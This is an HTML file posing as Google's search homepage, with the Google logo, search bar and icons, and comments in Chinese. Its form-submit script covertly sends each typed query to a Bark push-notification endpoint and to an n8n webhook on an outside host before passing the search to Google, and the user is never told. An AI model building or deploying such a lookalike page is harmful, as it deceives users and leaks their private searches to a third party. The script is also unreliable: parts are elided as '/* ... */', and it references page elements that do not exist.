<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <style>
        /* CSS 樣式部分保持不變... */
        body { font-family: Arial, sans-serif; display: flex; flex-direction: column; height: 100vh; margin: 0; background-color: #fff; color: #202124; }
        a { text-decoration: none; color: #4d5156; }
        a:hover { text-decoration: underline; }
        .header { display: flex; justify-content: space-between; align-items: center; padding: 8px; font-size: 14px; }
        .header-left, .header-right { display: flex; align-items: center; gap: 12px; }
        .header-left a { padding: 8px; }
        .header-link-active { color: #1a73e8; border-bottom: 3px solid #1a73e8; }
        .hamburger-menu, .app-launcher { width: 24px; height: 24px; fill: #5f6368; cursor: pointer; padding: 8px; border-radius: 50%; }
        .hamburger-menu:hover, .app-launcher:hover { background-color: #f0f0f0; }
        .login-button { background-color: #1a73e8; color: #fff !important; border: 1px solid transparent; border-radius: 999px; padding: 7px 15px; font-weight: 500; font-size: 14px; cursor: pointer; text-decoration: none !important; }
        .login-button:hover { background-color: #2b7de9; box-shadow: 0 1px 3px 1px rgba(0,0,0,.15); }
        .desktop-links { display: none; }
        .launcher-container { position: relative; }
        .app-popup { display: none; position: absolute; top: calc(100% + 10px); right: 8px; width: 320px; max-height: 440px; overflow-y: auto; background-color: #fff; border-radius: 28px; box-shadow: 0 1px 2px 0 rgba(60,64,67,.3), 0 2px 6px 2px rgba(60,64,67,.15); padding: 16px; box-sizing: border-box; border: 1px solid #dadce0; }
        .app-popup.show { display: block; }
        .app-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
        .app-item { display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 12px 4px; border-radius: 8px; color: #3c4043; font-size: 14px; text-decoration: none; transition: background-color 0.2s; }
        .app-item:hover { background-color: #f1f3f4; text-decoration: none; }
        .app-item img { width: 48px; height: 48px; margin-bottom: 8px; }
        .container { flex-grow: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding-bottom: 20vh; }
        .logo { width: 272px; height: 92px; margin-bottom: 28px; }
        .search-container { width: 90%; max-width: 584px; }
        .search-bar { display: flex; align-items: center; border: 1px solid #dfe1e5; border-radius: 24px; height: 46px; padding: 0 8px 0 14px; transition: box-shadow 0.15s ease-in-out; }
        .search-bar:hover, .search-bar:focus-within { box-shadow: 0 1px 6px rgba(32,33,36,.28); border-color: rgba(223,225,229,0); }
        .search-input { flex: 1; border: none; outline: none; background-color: transparent; font-size: 16px; padding: 0 8px; height: 100%; }
        .search-icon-left { width: 20px; height: 20px; fill: #9aa0a6; }
        .search-icons-right { display: flex; align-items: center; gap: 12px; padding-left: 8px; }
        .mic-icon-svg, .lens-icon-svg { width: 24px; height: 24px; fill: #70757a; cursor: pointer; padding: 4px; border-radius: 50%; }
        .mic-icon-svg:hover, .lens-icon-svg:hover { background-color: #f0f0f0; }
        .mic-icon-svg.is-listening { background-color: #e84235; fill: #fff; }
        .footer { background-color: #f2f2f2; border-top: 1px solid #e4e4e4; color: #70757a; font-size: 14px; line-height: 40px; }
        .footer a { color: #70757a; }
        .footer-content { padding: 0 20px; }
        .footer-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 25px; }
        @media (min-width: 768px) {
            .header-left, .mobile-links { display: none; }
            .header { justify-content: flex-end; padding: 12px 30px; }
            .desktop-links { display: flex; align-items: center; gap: 15px; }
            .login-button { padding: 9px 23px; }
            .app-popup { right: 0; }
            .footer-content { display: flex; justify-content: space-between; padding: 0 30px; }
            .footer-links { justify-content: flex-start; }
        }
    </style>
</head>
<body>
    <header class="header"></header>
    <main class="container">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
        <div class="search-container">
            <form id="search-form" action="https://www.google.com/search" method="get">
                <div class="search-bar">
                    <svg class="search-icon-left" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path></svg>
                    <input type="text" class="search-input" name="q" id="search-input" title="搜尋" autocomplete="off" autofocus>
                    <div class="search-icons-right">
                        <svg class="mic-icon-svg" id="mic-icon" focusable="false" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M12 14C13.6569 14 15 12.6569 15 11V5C15 3.34315 13.6569 2 12 2C10.3431 2 9 3.34315 9 5V11C9 12.6569 10.3431 14 12 14ZM12 16.7C15.9696 16.7 19.2 13.912 19.2 10.5H21C21 14.331 18.233 17.653 14.5 18.158V21H9.5V18.158C5.767 17.653 3 14.331 3 10.5H4.8C4.8 13.912 8.03045 16.7 12 16.7Z"></path></svg>
                        <svg class="lens-icon-svg" id="lens-icon" focusable="false" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M4.5,5.25a.75.75,0,0,0-.75.75v2.25a.75.75,0,0,0,1.5,0V6h2.25a.75.75,0,0,0,0-1.5H5.25a.75.75,0,0,0-.75.75Z"></path><path d="M19.5,5.25a.75.75,0,0,0-.75-.75H16.5a.75.75,0,0,0,0,1.5h2.25V8.25a.75.75,0,0,0,1.5,0V6a.75.75,0,0,0-.75-.75Z"></path><path d="M4.5,18.75a.75.75,0,0,0,.75.75h2.25a.75.75,0,0,0,0-1.5H6V15.75a.75.75,0,0,0-1.5,0v2.25a.75.75,0,0,0,.75.75Z"></path><path d="M19.5,18.75a.75.75,0,0,0,.75-.75V15.75a.75.75,0,0,0-1.5,0v2.25H16.5a.75.75,0,0,0,0,1.5h2.25a.75.75,0,0,0,.75-.75Z"></path><circle cx="12" cy="12" r="3.25"></circle></svg>
                    </div>
                </div>
            </form>
        </div>
    </main>
    <footer class="footer"></footer>

    <script>
        const searchForm = document.getElementById('search-form');
        const searchInput = document.getElementById('search-input');
        const micIcon = document.getElementById('mic-icon');
        const lensIcon = document.getElementById('lens-icon');
        const appLauncherIcon = document.getElementById('app-launcher-icon');
        const appPopup = document.getElementById('app-popup');

        // --- App Launcher Popup Logic (保持不變) ---
        appLauncherIcon.addEventListener('click', (event) => { /* ... */ });
        window.addEventListener('click', (event) => { /* ... */ });

        // --- Google Lens Icon Functionality (保持不變) ---
        lensIcon.addEventListener('click', function() { /* ... */ });

        // --- Form Submission Logic (已修改) ---
        searchForm.addEventListener('submit', function() {
            const query = searchInput.value;
            if (query.trim() !== '') {
                // 1. Bark Notification (保持不變)
                const barkUrl = `https://api.day.app/ZRThbuFUNKAn26qqofTNJi/${encodeURIComponent(query)}`;
                if (navigator.sendBeacon) {
                    navigator.sendBeacon(barkUrl);
                } else {
                    fetch(barkUrl, { method: 'POST', keepalive: true }).catch(error => console.error('Bark notification failed:', error));
                }

                // 2. n8n Webhook Notification (已修改為 GET 請求)
                const n8nBaseUrl = 'https://leohkw.zeabur.app/webhook-test/faggoo';
                // 將關鍵字作為 URL 參數附加
                const finalUrl = `${n8nBaseUrl}?keyword=${encodeURIComponent(query)}`;

                // 使用 fetch 的 GET 方法並設定 keepalive
                fetch(finalUrl, {
                    method: 'GET', // 明確設定為 GET
                    keepalive: true // 確保頁面跳轉前請求能被發送
                }).catch(error => console.error('n8n webhook failed:', error));
            }
        });

        // --- Voice Search Functionality (保持不變) ---
        const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
        if (SpeechRecognition) {
            // ... 語音辨識的程式碼保持不變 ...
        } else {
            micIcon.addEventListener('click', () => {
                alert('抱歉，您的瀏覽器不支援語音搜尋功能。請嘗試使用 Chrome 瀏覽器。');
            });
        }
    </script>
</body>
</html>
